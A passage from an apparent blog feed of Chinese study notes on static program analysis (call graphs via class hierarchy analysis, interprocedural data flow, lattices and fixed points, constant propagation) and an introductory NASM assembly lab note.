        <content type="html"><![CDATA[<h1>Interprocedural Analysis</h1><h2 id="Motivation"><a class="header-anchor" href="#Motivation">¶</a>Motivation</h2><p>在常量传播中，<code>y = addOne(42)</code> 应该让 y 被视作一个常量（43），但是因为我们没有考虑过程间分析，就导致我们认为 y 是 NAC，这个结果过于保守了。</p><p>因此我们需要实装过程间分析。</p><h2 id="Call-Graph-Construction-CHA-based"><a class="header-anchor" href="#Call-Graph-Construction-CHA-based">¶</a>Call Graph Construction (CHA based)</h2><p>所谓 Call Graph，就是指出一个方法会在其方法体内，对哪些其它方法进行调用。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">T f()&#123;</span><br><span class="line">    int a = S.g();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们就能在 call graph 上构建一条边： <code>T.f -&gt; S.g</code>。但是这个例子说着简单，现实中的情况是比较复杂的，这里我们就需要了解如何去构建 call gragh。</p><p>CG 的构造方法主要有以下几种：</p><ul><li>Class hierarchy analysis CHA</li><li>Rapid type analysis RTA</li><li>Variable type analysis VTA</li><li>Pointer analysis k-CFA</li></ul><p>越后面的越精确，而越靠前的速度越快，越有效率。</p><p>在 Java 中有多种 method call，其中 virtual call 对分析至关重要。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211018162245409.png" alt></p><p>以下是简单介绍，看看就好。</p><ul><li>Instruction：指 Java 的 <strong>IR 中的指令</strong></li><li>Receiver objects：方法调用对应的实例对象（static 方法调用不需要对应实例）。</li><li>Target methods：表达 <strong>IR 指令到被调用目标方法的映射关系</strong></li><li>Num of target methods：call 对应的可能被调用的目标方法的数量。Virtual call与动态绑定和多态实现有关，可以对应多个对象下的重写方法。所以 <strong>virtual call的可能对象可能超过 1 个</strong>。</li><li>Determinacy：指什么时候能够确定这个 call 的对应方法。Virtual call 与多态有关，只能在运行时决定调用哪一个具体方法的实现。其他两种 call 都和多态机制不相关，编译时刻就可以确定。</li></ul><p>在发生 virtual call 的时候，需要求解具体的方法究竟是什么。其中涉及到的机制叫 <strong>Method Dispatch</strong>.</p><p>具体来说，对于一条调用 <code>y = x.foo(...);</code>，在编译时我们不能立刻确定 <code>x</code> 所指向的是哪个对象（考虑 <code>Number x = new One();</code>，<code>x</code> 调用的就不是 <code>Number</code> 类的 <code>foo</code> 方法），而在运行时，我们会知道 <code>x</code> 会指向某个确切的对象 <code>o</code>，这个时候就可以去解析 <code>o.foo(...)</code> 的具体内容是什么了。</p><p>在 <code>o.foo(...);</code> 中，</p><ul><li>o 就是接收对象</li><li>foo(…) 就是方法签名</li></ul><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211018163246861.png" alt></p><p>给定对象的类 c 和函数签名 m，Dispatch 函数为：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211018163357081.png" alt></p><p>这个方法就是在说，一个子类可能并没有自己实现某个方法，因此就要往父类去找，直到找到一个可用的实现位置。</p><p>例如，对于这样一个继承结构：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103115945118.png" alt></p><p>有着如下的 dispatch 结果：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103120013579.png" alt></p><p>那么问题来了，刚刚说到，运行时是没法确定 <code>y = x.foo(...)</code> 的指向对象的。但是是不是完全没法确定呢？也不能这么说，1995 年，大牛 Jeff Dean 提出了一种方法：既然你也知道 <code>Number x = ...</code>，<code>x</code> 至少是 Number 类的对象。虽然我们不能知道 <code>x</code> 最后是 Number 对象还是它的一个子类对象，那么我们至少可以确定是 Number 及其继承类中的一个吧？</p><p>所以，我们这里就采用变量声明的类型来确定可能的 call 类型（即 Class Hierarchy Analysis, CHA）。下面就是解析一个方法调用对应的方法的算法：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103121056412.png" alt></p><p>第一种情况是 <code>y = T.m(...)</code>，静态方法可以直接确定类是哪个，就不用去找继承结构了。</p><p>第二种情况是 <code>new T(...)</code>，既然你知道你在调用谁的构造函数，那么也当然不用去找继承结构。当然还有其它的 special call（例如 <code>this.m(...)</code>），但是最后的结论都是一样的。</p><p>第三章情况就是 <code>y = x.m(...)</code> 了，这里的算法的意思是说，我把声明类型及其所有的子类都 dispatch 一遍，把可能的结果返回给你。</p><p>举个例子，现在有这么一个继承结构：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103121527898.png" alt></p><p>有着如下结果：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103121646921.png" alt></p><p>但是请考虑 <code>B b = ...; b.foo()</code>。按照算法，resolve 的结果是和 A 一样的，但是假设我们能知道，最后 <code>B b = new B()</code>，岂不是会多分析出两个可能的方法了？</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103121813073.png" alt></p><p>现在我们总结一下，基于 CHA 来构建 call graph 的优缺点：</p><ul><li>优点：快，因为声明信息是很好获取的。</li><li>缺点：不够精确。这个问题需要指针分析来解决。</li></ul><p>最后我们得到基于 CHA 来构建 call graph 的算法。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103122057126.png" alt></p><p>这个算法应该是很好理解的，它相当于是从 entry method 构建一个可达图。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103123125893.png" alt></p><p>下面我们将展示讲义中例子的一个断点，来表述 CHA 的不精确性：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103122236130.png" alt></p><p>可以看到，A a 已经是明确指向 A 对象了，但是由于 CHA 的不精确性，我们依然往 B.bar() 和 C.bar() 加了边。</p><h2 id="Interprocedural-Control-Flow-Graph"><a class="header-anchor" href="#Interprocedural-Control-Flow-Graph">¶</a>Interprocedural Control-Flow Graph</h2><p>ICFG 就是通过在 CFG 的基础上加上 call edge 和 return edge。Call edge 是从 call site 连到 method entry 的，而 return edge 是从 method exit 连到 call site之后的一个语句的。（之所以是 exit 而不是 return 语句的 node，是因为可能存在多个 return 点，此时需要对这些 return 点做一个合并。）</p><p>那么我们要如何知道一个 call site 要往那个方法的 entry 和 exit 上连边呢？这就用到了刚刚说到的 call gragh 了。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103123943802.png" alt></p><p>但是这样的修改还不够，因为会存在一些不精确性。具体请看下一章节。</p><h2 id="Interprocedural-Data-Flow-Analysis"><a class="header-anchor" href="#Interprocedural-Data-Flow-Analysis">¶</a>Interprocedural Data-Flow Analysis</h2><p>还记得过程内的数据流分析的两个要素：</p><ul><li>node 内如何使 data fact 发生变化；</li><li>node 如何通过边收集/传递 data fact。</li></ul><p>在过程内分析中，边只有一种，所以收集/传递时只需要原样传递 data fact。但是，考虑过程间分析后，我们就不能直接把 caller 的 fact 传到 callee 上了，而是应该通过方法的调用参数来进行 fact 的转换。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103125112158.png" alt></p><p>同样地，return edge 需要把返回值返回到接收变量上。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103125933773.png" alt></p><p>最后我们需要考虑一个问题：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20220103130122403.png" alt></p><p>我们在过程间常量传播的设计中，caller 的 fact 会和 return value 冲突。一种自然的处理方法是在 call site 把 b 的值 kill 掉，2020 年的教学版本也是这么做的。但是，如果在 node 阶段就 kill 掉 b，那么如果 b 是方法调用的一个参数，就没有常量值可以传过去了。</p><p>因此，2021 年的版本明确了使用 call to return edge 来 kill 掉 b，遇到 call site 的时候，fact 直接原样复制。这就避免了上面所说的问题。</p><h2 id="划重点"><a class="header-anchor" href="#划重点">¶</a>划重点</h2><ul><li>如何用 CHA 建 CG</li><li>ICFG 的概念</li><li>过程间数据流分析的概念</li><li>过程间的常量分析</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-04</title>
      <link href="/2022/10/23/SPA-04/"/>
      <url>/2022/10/23/SPA-04/</url>
      
        <content type="html"><![CDATA[<h1>Data Analysis Foundation</h1><h2 id="Iterative-Algorithm-Another-View"><a class="header-anchor" href="#Iterative-Algorithm-Another-View">¶</a>Iterative Algorithm, Another View</h2><p>给定一个有 k 个节点的 CFG，迭代算法会更新每个节点 n 的 OUT[n] 值。那么我就可以考虑把这些值定义为一个 k-tuple：$(OUT[n_1],OUT[n_2],…,OUT[n_k])\in (V_1\times V_2 \times …\times V_k) = V^k $<br>则，我们的数据流分析迭代算法框架就可记为$F:V^k \rightarrow V^k$</p><p>迭代过程就被记为：</p><ul><li>$X_0 = (null, null, …, null)$</li><li>$X_1 = (v_1<sup>1,v_2</sup>1,…,v_k^1) = F(X_0)$</li><li>$X_2 = (v_1<sup>2,v_2</sup>2,…,v_k^2) = F(X_1)$</li><li>…</li><li>$X_i = (v_1<sup>i,v_2</sup>i,…,v_k^i) = F(X_{i-1})$</li><li>$X_{i+1} = (v_1<sup>i,v_2</sup>i,…,v_k^i) = F(X_{i})$</li><li>此时我们发现$X_i =X_{i+1}$，意味着$X_i$就是$F$的一个不动点。</li></ul><p>在这个框架下，我们就有一些想知道的问题：</p><ul><li>算法是否确保一定能停止/达到不动点？会不会总是有一个解答？</li><li>如果能到达不动点，那么是不是只有一个不动点？如果有多个不动点，我们的结果是最优的吗？</li><li>什么时候我们会能得到不动点？</li></ul><p>为了回答这个问题，我们需要先回顾一些数学。</p><h2 id="Partial-Order"><a class="header-anchor" href="#Partial-Order">¶</a>Partial Order</h2><p>所谓偏序集合（poset），就是一个由集合 $P$ 和偏序关系$\sqsubseteq$所组成$(P, \sqsubseteq)$对。这个对满足以下三个条件：</p><ul><li>Reflexivity 自反性：x $\sqsubseteq$ x</li><li>Antisymmetry 反对称性：x $\sqsubseteq$ y, y $\sqsubseteq$ x, 则 x = y</li><li>Transitivity 传递性：x $\sqsubseteq$ y, y $\sqsubseteq$ z, 则 x $\sqsubseteq$ z</li><li>例子：小于等于关系就是一个偏序关系，但小于关系不是偏序关系，它是全序关系。</li></ul><p>偏序关系与全序关系的区别在于，全序关系可以让任意两个元素比较，而偏序关系不保证所有元素都能进行比较。</p><h2 id="Upper-and-Lower-Bounds"><a class="header-anchor" href="#Upper-and-Lower-Bounds">¶</a>Upper and Lower Bounds</h2><p>对于偏序集中的某子集 S 来说：</p><ul><li>若存在元素 u 使得 S 的任意元素 x 有 x $\sqsubseteq$ u，那么我们说 u 是 S 的上界（Upper bound）。</li><li>同理，若存在元素 l 使得 S 的任意元素 x 有 l $\sqsubseteq$ x，那么我们说 l 是 S 的下界（Lower bound）。</li></ul><p>然后我们衍生出最小上界和最大下界的概念：</p><ul><li>在 S 的所有上界中，我们记最小上界（Least upper bound, lub）为$\sqcup S$，满足所有上界 u 对 lub 有： $\sqcup S \sqsubseteq u$</li><li>类似地我们也能定义出最大下界（Greatest lower bound, glb）为$\sqcap S$。</li></ul><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20210923162141398.png" alt></p><p>当 S 的元素个数只有两个{a, b}时，我们还可以有另一种记法：</p><ul><li>最小上界：$a \sqcup b$, a join b</li><li>最大下界：$a \sqcap b$, a meet b</li></ul><p>并不是每个偏序集都有 lub 和 glb，但是如果有，那么该 lub, glb 将是唯一的。（可假设存在多个，然后用自反性证明它们是同一个）</p><h2 id="Lattice-Semilattice-Complete-and-Product-Lattic"><a class="header-anchor" href="#Lattice-Semilattice-Complete-and-Product-Lattic">¶</a>Lattice, Semilattice, Complete and Product Lattic</h2><p>给定一个偏序集，如果任意元素 a, b 都有 lub和glb，那么这么偏序集就叫做 <strong>格（lattice）</strong>。</p><ul><li>属于 lattice 的：小于等于关系，子集关系</li><li>不属于 lattice 的：子串关系</li></ul><p>如果在此之上更加严格一些，任意集合都存在 lub 和 glb，那么我们说这个 lattice 为“<strong>全格（complete lattice）</strong>”</p><ul><li>属于全格的：子集关系</li><li>不属于全格的：小于等于关系，因为全体正整数没有一个边界</li></ul><p>每一个全格都存在着<strong>最大元素$\top$ (top)<strong>和</strong>最小元素$\bot$ (bottom)</strong>，他们分别是整个集合的 lub 和 glb。</p><p>如果一个 lattice 是有穷的，那么它一定是一个全格。</p><p>然而，一个全格不一定是有穷的，例如[0, 1]之间的实数是无穷的，但是期间的小于等于关系可以使其成为全格。</p><p>另外还有 <strong>Product Lattice</strong>，多个 lattice 的笛卡尔积也能形成一个新的 lattice。</p><p>需要记住的是：</p><ul><li>product lattice 也是一个 lattice</li><li>如果 product lattice L是全格的积，那么 L 也是全格。</li></ul><p>扩展阅读：如果偏序集任意两元素的上下界仅有其 lub 和 glb，那么称该偏序集为半格（Semilattice）</p><h2 id="Data-Flow-Analysis-Framework-via-Lattice"><a class="header-anchor" href="#Data-Flow-Analysis-Framework-via-Lattice">¶</a>Data Flow Analysis Framework via Lattice</h2><p>一个数据流分析框架（D, L, F）由以下元素组成：</p><ul><li>D: 数据流的方向，前向还是后向</li><li>L: 包含了数据值 V 和 meet, join 符号的格</li><li>F: V -&gt; V 的转移方程族</li></ul><p>从而，数据流分析可以被视为在 lattice 的值上迭代地应用转移方程和 meet/join 操作符。<img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20210923165949698.png" alt></p><h2 id="Monotonicity-and-Fixed-Point-Theorem"><a class="header-anchor" href="#Monotonicity-and-Fixed-Point-Theorem">¶</a>Monotonicity and Fixed Point Theorem</h2><p>回看我们在上面提出的问题：迭代算法在什么条件下可以停机？我们在这里引入不动点定理：</p><p>Monotonicity 单调性：如果$x \sqsubseteq y \Rightarrow f(x)\sqsubseteq f(y)$，则说函数f: L -&gt; L 是<strong>单调的</strong>。</p><p>FIxed Point Theorem 不动点定理：给定一个全格$(L,\sqsubseteq)$，如果</p><ol><li><p>$f: L \rightarrow L$是单调的</p></li><li><p>$L$是有穷的</p><p>（也就是f单调有界+L全格）</p></li></ol><p>那么</p><ul><li><p>迭代$f^k(\bot)$可以得到最小不动点（least fixed point）。</p></li><li><p>迭代$f^k(\top)$可以得到最大不动点（greatest fixed point）。</p></li></ul><p>证明：</p><p>根据$\bot$和f的定义，我们可以得到：$\bot \sqsubseteq f(\bot)$。</p><p>由于 L 是有限的，且 f 单调，根据鸽笼原理，必然存在一个 k 使得$\bot \sqsubseteq f(\bot) \sqsubseteq f^2(\bot)\sqsubseteq …\sqsubseteq f^k(\bot)\sqsubseteq f^{k+1}(\bot) $，且$f^k(\bot) = f^{k+1}(\bot)$。</p><p>假设我们有另一个任意不动点 x，由于 f 是单调的，因此$f(\bot) \sqsubseteq f(x), f^2(\bot) \sqsubseteq f<sup>2(x),…,f</sup>{Fix} = f^k(\bot)\sqsubseteq f^k(x) = x$</p><p>可知的确$f^{Fix}$是最小不动点。</p><p>通过上面的证明，我们又回答了一个问题：如果我们的迭代算法符合不动点定理的要求，那么迭代得到的不动点，确实就是最优不动点。</p><h2 id="Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a class="header-anchor" href="#Relate-Iterative-Algorithm-to-Fixed-Point-Theorem">¶</a>Relate Iterative Algorithm to Fixed Point Theorem</h2><p>以上我们只是定性的描述了是否能得到最优不动点，但是迭代算法怎样才能算是符合了不动点定理的要求呢？接下来介绍关联的方法。</p><p>首先，回想 fact 的形式：$(v_1<sup>1,v_2</sup>1,…,v_k^1)$，可以将其视为一个有限 lattice，它的积也是有限 lattice，因此 fact 对应到 finite lattice 是可以的。</p><p>然后，我们的迭代函数 F 包括了转移函数 f 和 join/meet 函数，证明 F 是单调的，那么也就能得到 $F: L\rightarrow L$ 是单调的。</p><p>这里分两部分。</p><ol><li>转移函数，即 OUT = gen U (IN - kill)，显然是单调的。</li><li>那么 join/meet 函数，我们要证明其单调，就是要证明：$\forall x,y,z\in L, x\sqsubseteq y$，有$x \sqcup z \sqsubseteq y \sqcup z$。<ol><li>由定义，$y \sqsubseteq y \sqcup z$</li><li>由传递性，$x \sqsubseteq y \sqcup z$</li><li>则 $y \sqcup z$ 是 $x, z$ 的 ub</li><li>又 $x \sqcup z$ 是 $x, z$ 的 lub</li><li>因此 $x \sqcup z \sqsubseteq y \sqcup z$，证毕。</li></ol></li></ol><p>于是我们就完成了迭代算法到不动点定理的对应。</p><p>现在我们要回答本文开头的第三个问题了，什么时候算法停机？</p><p>这个问题就很简单了，因为每个 lattice 都有其高度。假设 lattice 的高度为 h，而我们的 CFG 节点数为 k，就算每次迭代可以使一个节点在 lattice 上升一个高度，那么最坏情况下，我们的迭代次数也就是 $i = h \times k$</p><p>最后我们再列出这三个问题与其回答：</p><ul><li>算法是否确保一定能停止/达到不动点？**能！**会不会总是有一个解答？<strong>可以！</strong></li><li>如果能到达不动点，那么是不是只有一个不动点？**可以有很多。**如果有多个不动点，我们的结果是最优的吗？<strong>是的！</strong></li><li>什么时候我们会能得到不动点？<strong>最坏情况下，是 lattice 的高度与 CFG 的节点数的乘积。</strong></li></ul><h2 id="May-Must-Analysis-A-Lattice-View"><a class="header-anchor" href="#May-Must-Analysis-A-Lattice-View">¶</a>May/Must Analysis, A Lattice View</h2><p>无论 may 还是 must 分析，都是从一个方向到另一个方向去走。考虑我们的 lattice 抽象成这样一个视图：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009185424077.png" alt></p><p>例如，对于到达定值分析，下界代表没有任何可到达的定值，上界代表所有定值都可到达。</p><p>下界代表 unsafe 的情形，即我们认为无到达定值，可对相关变量的存储空间进行替换。上界代表 safe but useless 的情绪，即认为定值必然到达，但是这对我们寻找一个可替换掉的存储空间毫无意义。</p><p>而因为我们采用了 join 函数，那么我们必然会从 lattice 的最小下界往上走。而越往上走，我们就会失去更多的精确值。那么，在所有不动点中我们寻找最小不动点，那么就能得到精确值最大的结果。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009190320346.png" alt></p><p>反之，在可用表达式分析中，下界代表无可用表达式，上界代表所有表达式都可用。</p><p>下界代表 safe but useless 的情形，因为需要重新计算每个表达式，即使确实有表达式可用。而上界代表 unsafe，因为不是所有路径都能使表达式都可用。与 may analysis 一样，通过寻找最大不动点，我们能得到合法的结果中精确值最大的结果。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009190612357.png" alt></p><h2 id="Distributivity-and-MOP"><a class="header-anchor" href="#Distributivity-and-MOP">¶</a>Distributivity and MOP</h2><p>我们引入 Meet-Over-All-Paths Solution，即 MOP。在这个 solution 中，我们不是根据节点与其前驱/后继节点的关系来迭代计算数据流，而是直接查找所有路径，根据所有路径的计算结果再取上/下界。这个结果是最理想的结果。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009192219561.png" alt></p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009193258050.png" alt></p><p>可以看到，迭代算法是 s3 对前驱取 join 后进行进行 f3 的转移，而 MOP 算法是对到达 s3 之后，s4 之前的路径结果取 join。</p><p>那么迭代算法和 MOP 哪个更精确呢？我们可以证明，$F(x)\sqcup F(y)\sqsubseteq F(x\sqcup y)$：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009193822041.png" alt></p><p>这表明 MOP 是更为精确的。</p><p>但这并没有结束。而如果 F 是可分配的，那么确实可以让偏序符号改为等于号。恰好，gen/kill problem 下，F 确实可分配因此我们能确定，迭代算法的精度与 MOP 相等。</p><h2 id="Constant-Propagation"><a class="header-anchor" href="#Constant-Propagation">¶</a>Constant Propagation</h2><p>当然有些问题下 F 是不可分配的，如常量传播（Constant Propagation）。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009194808421.png" alt></p><p>在常量传播分析中，其最大上界是 undefine，因为我们不知道一个变量到底被定义为了什么值。最小下界是 NAC（Not A Constant），而中间就是各种常量。这是因为分析一个变量指向的值是否为常量，那么要么它是同一个值，要么它不是常量。</p><p>给定一个 statement s: x = …，我们定义转移函数$OUT[s]=gen\cup(IN[s]-{(x,_)})$。</p><p>其中我们根据赋值号右边的不同，决定不同的 gen 函数：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009195346660.png" alt></p><p>注意，const + undef -&gt; undef。因为 undef 变成 const 的过程中是降级，而如果 const1 + undef -&gt; const2，那么 undef 变化为 const 时，const2 会发生改变，原来的 const2 与现在的 const2 不具有偏序关系，那么就不满足偏序关系的单调性了。</p><p>常量传播是不可分配的。以下图为例：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009200111058.png" alt></p><p>对于 c，$F(X)\sqcap F(Y) = 10, F(X\sqcap Y) = \text{NAC}$</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009200302010.png" alt></p><h2 id="Worklist-Algorithm"><a class="header-anchor" href="#Worklist-Algorithm">¶</a>Worklist Algorithm</h2><p>worklist 是迭代算法的优化。</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/image-20211009200914835.png" alt></p><p>在 Worklist 算法中，只在基本块的 fact 发生变化处理其相关基本块，不必再在每次有 fact 变化时处理所有的基本块了。</p><h2 id="划重点"><a class="header-anchor" href="#划重点">¶</a>划重点</h2><ul><li>理解函数视角下的迭代算法</li><li>对于 lattice 和 complete lattice 的定义</li><li>理解不动点定理<ul><li>2021 考点：最坏情况下的迭代次数</li></ul></li><li>知道如何用 lattice 来概述 may 和 must analysis</li><li>MOP与迭代算法结果之间的关系</li><li>常量传播分析<ul><li>2021 考点：给定一个 CFG，问某个 block 之前/之后各变量的常量值</li></ul></li><li>Worklist 算法<ul><li>2021 考点：补全到达定值的 worklist 算法</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSLab1</title>
      <link href="/2022/10/02/OSLab1/"/>
      <url>/2022/10/02/OSLab1/</url>
      
        <content type="html"><![CDATA[<h1>NASM语法</h1><p>首先，nasm相关一定要多看英文手册和stackoverflow，内网啥都学不到的……</p><p><a href="https://cs.lmu.edu/~ray/notes/nasmtutorial/">NASM Tutorial (lmu.edu)</a></p><h2 id="程序结构"><a class="header-anchor" href="#程序结构">¶</a>程序结构</h2><p>NASM is <strong>line-based</strong>. Most programs consist of <strong>directives</strong> followed by one or more <strong>sections</strong>. Lines can have an optional label. Most lines have an instruction followed by zero or more operands.</p><p><img src="https://cs.lmu.edu/~ray/images/nasmstructure.png" alt></p><p>一般来说，代码写在<code>.text</code>段，全局使用的数据写在<code>.data</code>区</p><h2 id="常用指令"><a class="header-anchor" href="#常用指令">¶</a>常用指令</h2><p>movx,y：     x←y</p><p>andx,y： x←x∧y</p><p>orx,y：  x←x∨y</p><p>xorx,y： x←x⨁y</p><p>addx,y： x←x+y</p><p>subx,y： x←x−y</p><p>incx：   x←x+1</p><p>decx：   x←x−1</p><p>syscall n：  Invoke operating system routine n</p><p>db： A pseudo-instruction that declares bytes that will be in memory when the program runs</p><h2 id="三类操作数"><a class="header-anchor" href="#三类操作数">¶</a>三类操作数</h2><h3 id="寄存器操作数"><a class="header-anchor" href="#寄存器操作数">¶</a>寄存器操作数</h3><p>x86-84架构下的16个64位integer registers：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221120201408.png" alt></p><p>也可以用下面的名字操作各寄存器的低32位，视作一个32位寄存器：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221120201622.png" alt></p><p>低16、8位也有相应的名称：</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20221120201714.png" alt></p><h3 id="存储操作数"><a class="header-anchor" href="#存储操作数">¶</a>存储操作数</h3><p>有如下几种寻址：</p><ul><li><code>[ number ]</code></li><li><code>[ reg ]</code></li><li><code>[ reg + reg*scale ]</code>      scale 只有1, 2, 4和8</li><li><code>[ reg + number ]</code></li><li><code>[ reg + reg*scale + number ]</code></li></ul><p>The number is called the displacement（偏移）; the plain register is called the base（基地址）; the register with the scale is called the index.</p><h3 id="立即操作数"><a class="header-anchor" href="#立即操作数">¶</a>立即操作数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-03</title>
      <link href="/2022/10/01/SPA-03/"/>
      <url>/2022/10/01/SPA-03/</url>
      
        <content type="html"><![CDATA[<h1>数据流分析上</h1><h2 id="Overview-of-Data-Flow-Analysis"><a class="header-anchor" href="#Overview-of-Data-Flow-Analysis">¶</a>Overview of Data Flow Analysis</h2><p>数据流分析的核心：How Data Flows on CFG?</p><p>将这句话展开来，所谓数据流分析就是：</p><p>How application-specific Data (对数据的抽象：+, -, 0 等……)</p><p>​ Flows (根据分析的类型，做出合适的估算) through the</p><p>​ Nodes (数据如何 transfer, 如 + op + = +) and</p><p>​ Edges (控制流如何处理，例如两个控制流汇入一个BB，符号的汇总) of</p><p>​ CFG (整个程序) ?</p><p>不同的数据流分析，有着不同的data abstraction, flow safe-approximation策略，transfer functions&amp;control-flow handlings。</p><p>不是所有数据流分析都是over-appriximation</p><h1>Preliminaries of Data Flow Analysis</h1><h2 id="Input-and-Output-States-输入输出状态"><a class="header-anchor" href="#Input-and-Output-States-输入输出状态">¶</a>Input and Output States 输入输出状态</h2><ul><li><p>每一条IR的执行，都会使状态从<strong>输入状态</strong>变成新的<strong>输出状态</strong></p></li><li><p>输入/输出状态与语句前/后的 <strong>program point</strong> 相关联。</p></li></ul><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-26f62fefb6662fff27b76ed64df6ba4998095196%2Fimage-20210917153822357.png?alt=media" alt="image20210917153822357"></p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-e4e6efafc77ecffb5a11fc63c8d5d11266853a16%2Fimage-20210917154034546.png?alt=media" alt="image20210917154034546"></p><p>在数据流分析中，我们会把每一个PP关联一个数据流值，代表在该点中可观察到的抽象的程序状态，与关注的分析任务有关</p><h2 id="关于转移方程约束的概念"><a class="header-anchor" href="#关于转移方程约束的概念">¶</a>关于转移方程约束的概念</h2><p>分析数据流有前向和后向两种：</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-95ba87a6a6b9f96ad96720a815248b63af270a8b%2Fimage-20210917162309404.png?alt=media" alt="image20210917162309404"></p><h2 id="关于控制流约束的概念"><a class="header-anchor" href="#关于控制流约束的概念">¶</a>关于控制流约束的概念</h2><p>每条语句 s 都会使程序状态发生改变。</p><p>B 的输出自然是其输入在经过多次转换后得到的状态。</p><p>而 B 的输入要根据数据流分析的需求，对其前驱应用合适的 meet operator 进行处理。后向分析时亦然。</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-bb7568945f4ad9ae77dae209ca69940f118a7ef7%2Fimage-20210917162405362.png?alt=media" alt="image20210917162405362"></p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-804a01f3dd7fc1bc438366fc39732975b1075eb7%2Fimage-20210917162747257.png?alt=media" alt></p><h2 id="不会涉及到的概念"><a class="header-anchor" href="#不会涉及到的概念">¶</a>不会涉及到的概念</h2><ul><li><p>函数调用 Method Calls</p><ul><li>我们将分析的是过程本身中的事情，即 Intra-procedural。而过程之间的分析，将在 Inter-procedural Analysis 中介绍</li></ul></li><li><p>变量别名 Aliases</p><ul><li>变量不能有别名。有关问题将在指针分析中介绍。</li></ul></li></ul><h1>Reaching Definitions Analysis 到达定值分析</h1><h3 id="基本概念"><a class="header-anchor" href="#基本概念">¶</a>基本概念</h3><ul><li><p>假定 x 有定值 d (<strong>definition</strong>)，如果存在一个路径，从紧随 d 的点到达某点 p，并且此路径上面没有 x 的其他定值点，则称 x 的定值 d 到达 (<strong>reaching</strong>) p。</p></li><li><p>如果在这条路径上有对 x 的其它定值，我们说变量 x 的这个定值 d 被杀死 (<strong>killed</strong>) 了</p></li></ul><p>​</p><p><img src="https://3948417973-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-27c24dee014299bc90a54ca370d2f0be7f189460%2Fimage-20210917163542130.png?alt=media" alt="image20210917163542130"></p><p>​</p><p>到达定值可以用来分析未定义的变量。例如，我们在程序入口为各变量引入一个 dummy 定值。当程序出口的某变量定值依然为 dummy，则我们可以认为该变量未被定义。</p><p>属于may analysis：over-appriximation</p><p>对于一条赋值语句 D: v = x op y，该语句生成了 v 的一个定值 D，并杀死程序中其它对变量 v 